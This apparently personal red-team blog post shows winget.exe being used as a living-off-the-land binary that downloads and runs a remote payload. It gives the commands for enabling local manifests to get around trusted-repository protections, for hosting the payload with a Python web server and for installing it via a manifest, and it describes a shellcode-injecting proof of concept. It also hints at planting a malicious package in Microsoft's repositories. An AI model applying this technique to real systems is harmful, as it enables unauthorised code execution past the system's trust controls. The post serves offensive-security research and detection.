---
layout: post
title: New Year, New LOLBAS?
description: Abusing Windows Package Manager tool winget.exe
last_modified_at:
author: "@saulpanders"
comments: true
tags: security, red-team
---
As a fun way to kick off the new year, here's a quick look at a "mostly useless" LOLBIN/LOLBAS - `winget.exe`. To see it in action, skip to the "Demo" section.

## Window Package Manager Tool
According to Microsoft: "The winget command line tool enables users to discover, install, upgrade, remove and configure applications on Windows... computers."
\
\
In other words, winget allows the user to extend the functionality of their Windows system - and may grant them elevated privileges to do so. \
\
Microsoft created a open source repo dubbed the [Microsoft Community Package Manifest Repository](https://github.com/microsoft/winget-pkgs) where independent and third party vendors can submit manifests for their own applications for consideration into the Microsoft managed package ecosystem.
### Quick Notes
A package manager is a system or toolset used to automate installing, upgrading, configuring and using software. Software Developers often use package manager tools to create specific environments for code execution. \
In this instance, Microsoft is moderating the environment where winget <i>usually</i> discovers and imports its packages from. 

### Facts & Features
Here are a few things that caught my eye when reading about this topic:
- Winget supports the following Installer types: EXE, MSI, MSIX, APPX, BURN, NULLSOFT, INNO
- Winget will trigger UAC for a regular user, not for an admin 
- Winget may show up in a sysadmin's batch scripts 
- Winget accepts a list of multiple packages in JSON format

### Logs
Winget installer saves its logs at the following path: \
`C:\Users\sampleUser\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\DiagOutputDir` \
Or according to MSDN: \
`%temp%\AICLI\*.log`

## Demo
Here's a walkthrough on how to leverage winget to download and execute a remote binary with elevated privileges.

#### Enable Local Manifest Files
To start, we need to tell winget to trust locally-defined manifest files. This step is crucial to circumvent the protections provided by Microsoft's trusted default repos - and therefore may require Local Administrator privileges to accomplish.
```
C:\> winget.exe settings --enable LocalManifestFiles
```
![Enable LocalManifestFiles](/assets/img/2022-01-02-New-Year-New-LOLBAS/enable_local_manifest.png)

#### Create Manifest 
Next, we create the local manifest file specifying our target "package" to install. Winget expects a manifest file in YAML format with certain key fields explicitly defined.
For example, the Installers field has a subfield called InstallerSha256 which requires a SHA-256 hash of the installer file referenced in the manifest. You can find an example manifest file [here](https://gist.github.com/saulpanders/00e1177602a8c01a3a8bfa932b3886b0) or consult [MSDN docs](https://docs.microsoft.com/en-us/windows/package-manager/package/manifest?tabs=minschema%2Cversion-example#tips-and-best-practices) to write your own.
![Demo Manifest](/assets/img/2022-01-02-New-Year-New-LOLBAS/manifest.png)
For this demo I am using a custom PoC written in golang that will print the size of a pointer to the screen, schedule a fiber, and inject shellcode that ultimately spawns calculator as the payload for winget to pull down and execute. 

#### Stage Payload
Now we are ready to stage the payload for our demo. I am using a DigitalOcean Ubuntu 18.04 LTS virtual cloud server as a quick test machine.
For hosting the payload, I like to use Python3's `http.server` module as a super low-effort web server.
```
$ python3 -m http.server 80
```

#### Run Winget
All we have to do now is run winget with our manifest file....
```
C:\> winget.exe install --manifest .\winget-manifest-test.yml
```
![Run Winget](/assets/img/2022-01-02-New-Year-New-LOLBAS/run_winget.png)
... and our payload + calculator arrives.
![Payload Execution](/assets/img/2022-01-02-New-Year-New-LOLBAS/payloads.png)

#### Profit?
The screenshot below demonstrates a view of our processes from ProcessHacker. 
![ProcessHacker](/assets/img/2022-01-02-New-Year-New-LOLBAS/ProcessHacker_view.png)
A couple of things to note:
 - Our test.exe payload had its name changed to TestInstall.1.0.0.exe, reflecting the information outlined in our manifest file.
 - During installation, TestInstall.1.0.0.exe becomes a child of AppInstallerCLI.exe
 
#### Demo Log
For completeness sake, here is winget's log output from our demo:
![Winget Log](/assets/img/2022-01-02-New-Year-New-LOLBAS/log.png)


### Why "Mostly Useless"?
When considering the viability of this technique on a stealthier engagement like a red team, there are several limiting factors to consider:
* You will have to have enabled the `LocalManifestFiles` setting which means you will need administrative rights. 
* You will need to drop a local manifest file describing the remote payload to disk on the target host.
* SmartScreen may still flag your payload as malicious
\\
Given these considerations, this trick seems more like a novelty than actual tradecraft. Unless, of course, you manage to slip a dirty package into Microsoft's trusted repos... 

## Source(s):
- [MSDN](https://docs.microsoft.com/en-us/windows/package-manager/winget/#production-recommended)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [ProcessHacker](https://processhacker.sourceforge.io/)
- [DigitalOcean](https://www.digitalocean.com/)



		